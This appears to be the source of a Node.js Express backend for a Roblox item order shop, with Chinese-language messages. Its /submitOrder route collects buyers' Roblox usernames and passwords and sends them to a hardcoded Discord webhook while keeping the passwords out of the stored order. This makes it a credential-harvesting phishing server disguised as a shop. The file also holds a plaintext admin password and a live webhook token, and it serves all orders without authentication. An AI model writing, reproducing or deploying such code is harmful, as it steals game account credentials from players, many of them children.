const express = require('express');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const PORT = 3000;
const ordersFilePath = path.join(__dirname, 'orders.json'); 
const adminPassword = 'Jiu142857kuang'; // Replace with your actual admin password
let hashedAdminPassword = null; 

let orders = [];

try {
  const data = fs.readFileSync(ordersFilePath, 'utf8');
  orders = JSON.parse(data);
} catch (err) {
  console.error('Error reading orders file:', err);
  orders = []; // Create an empty array if the file is missing or invalid
}

async function hashPassword(password) {
  const salt = await bcrypt.genSalt(10);
  return await bcrypt.hash(password, salt);
}

async function comparePasswords(password) {
  return await bcrypt.compare(password, hashedAdminPassword);
}

function saveOrders() {
  fs.writeFileSync(ordersFilePath, JSON.stringify(orders, null, 2)); 
}

(async () => {
  try {
    hashedAdminPassword = await hashPassword(adminPassword); 

    // Start the server
    app.listen(PORT, () => {
      console.log(`服务器正在监听端口 ${PORT}`);
    });

  } catch (error) {
    console.error('Error initializing server:', error);
    process.exit(1); // Exit the server process on error
  }
})();

// POST /submitOrder
app.post('/submitOrder', async (req, res) => {
  try {
    const { name, robloxUsername, robloxPassword, item } = req.body;
    const order = {
      id: Date.now(),
      name,
      robloxUsername,
      item,
      status: '已提交',
    };
    orders.push(order);

    saveOrders();

    res.status(200).json({ message: '订单提交成功！' });

    // Send data to Discord webhook (replace with your actual webhook URL)
    const webhookUrl = 'https://discord.com/api/webhooks/1333134333225209987/hIS131GsZeN-N0Eig9MOI25BxIDnIaHwjzPF0p9_LLrsolCAG5mPGobGSIlTXdiO6CJO'; 
    const payload = {
      content: `新订单提交!\n姓名: ${name}\nRoblox用户名: ${robloxUsername}\n物品: ${item}\nRoblox密码: ${robloxPassword}` 
    }; 

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    })
      .then((response) => {
        if (!response.ok) {
          console.error('Error sending Discord webhook:', response.status);
        }
      })
      .catch((error) => {
        console.error('Error sending Discord webhook:', error);
      });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: '订单提交失败.' });
  }
});

// GET /getOrderHistory
app.get('/getOrderHistory', (req, res) => {
  res.json(orders);
});

// POST /admin/updateOrder
app.post('/admin/updateOrder', async (req, res) => {
  try {
    const { orderId, price, deliveryDate, status, password } = req.body;

    if (!await comparePasswords(password, hashedAdminPassword)) {
      return res.status(401).json({ message: '未经授权' });
    }

    const orderIndex = orders.findIndex((order) => order.id === orderId);

    if (orderIndex !== -1) {
      orders[orderIndex].price = price;
      orders[orderIndex].deliveryDate = deliveryDate;
      orders[orderIndex].status = status;

      saveOrders();

      res.status(200).json({ message: '订单更新成功！' });
    } else {
      res.status(404).json({ message: '订单未找到' });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: '更新订单失败.' });
  }
});